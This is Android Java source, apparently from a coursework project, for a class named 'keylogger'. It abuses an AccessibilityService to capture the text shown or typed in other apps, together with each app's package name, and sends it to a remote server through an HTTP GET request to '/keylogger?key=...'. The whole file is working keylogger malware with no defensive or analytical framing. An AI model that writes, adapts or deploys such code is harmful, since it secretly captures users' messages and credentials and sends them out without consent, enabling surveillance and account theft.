package com.example.coursework1;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.IOException;

public class keylogger extends AccessibilityService {
    public String activeApp ="";
    public String lastMsg="";
    private String currentLog="";


    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                break;
        }


        String currApp=event.getPackageName().toString();
        if((activeApp.equals(currApp))|| activeApp.length()==0)
        {
            lastMsg=event.getText().toString();
            Log.d("Pre",currApp + "  :  "+lastMsg);
        }
        else
        {
            Log.d("Final ", activeApp +" :  "+lastMsg);
            currentLog = activeApp + " : " + lastMsg;
            try {
                httpActivity.sendGET("/keylogger?key="+currentLog);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        activeApp =currApp;
        lastMsg=event.getText().toString();
    }


    @Override
    public void onInterrupt() {

    }
}
